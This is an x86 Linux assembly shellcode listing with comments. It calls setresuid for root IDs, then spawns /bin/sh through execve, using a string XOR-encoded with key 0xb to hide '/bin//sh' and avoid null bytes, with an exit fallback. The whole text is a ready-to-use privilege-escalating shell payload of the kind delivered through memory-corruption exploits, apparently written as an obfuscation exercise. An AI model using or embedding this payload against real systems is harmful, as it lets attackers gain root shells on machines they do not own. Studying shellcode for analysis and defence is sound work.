global _start

section .text

_start:
	xor ecx, ecx		;; Clear ECX
	mul ecx			;; Clear EAX, EBX, EDX

	mov dl, 0xb		;; Store 0xb in EDX
	mov al, 0xaf		;; Store 0xaf in EAX
	sub al, dl		;; Subtract 0xb from 0xaf -> 0xa4
	int 0x80		;; Syscall, as in setresuid(0, 0, 0xb) - no need to clear 0xb

	push ecx		;; Push null bytes
	mov esi, 0x68732f24	;; Store XOR'd string of /bin/sh (Part #2) in ESI
	xor esi, edx		;; XOR string with EDX (0xb)
	push esi		;; Push /bin//sh (Part #2) to stack
	mov esi, 0x6e696224	;; Store XOR'd string of /bin/sh (Part #1) in ESI
	xor esi, edx		;; XOR string with EDX (0xb)
	push esi		;; Push /bin//sh (Part #1) to stack

	push esp		;; Push address of top of stack to stack
	pop ebx			;; Store address to top of stack in EBX

	push ecx		;; Push Null Bytes
	push ebx		;; Push ptr to top of stack

	xchg eax, edx		;; Swap EAX and EDX (store syscall # for execve in EAX, which was also the XOR key)

	int 0x80		;; Syscall, as in execve(/bin/sh, NULL, NULL)
	inc al			;; Increment EAX to 1 in case execve failed
	int 0x80		;; Run exit in case execve failed
